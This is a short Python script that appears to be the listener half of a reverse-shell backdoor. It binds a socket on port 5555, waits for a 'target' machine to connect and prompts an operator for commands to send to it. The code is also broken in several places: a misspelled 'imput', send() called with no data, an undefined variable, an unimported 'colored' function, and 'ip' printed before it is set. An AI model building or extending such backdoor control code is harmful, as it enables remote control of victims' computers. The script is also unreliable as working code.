import socket
import termcolor
import json

def reliable_send():
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def target_communication():
    command = imput ('* Sell~%s: ' % str(ip))
    target.send()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(colored('[+] Target Connected From: ' + str(ip), 'green'))
sock.listen(5)
target, ip = sock.accept()
print(colored('[+] Target Connected From: ' + str(ip), 'green'))
target_communication()
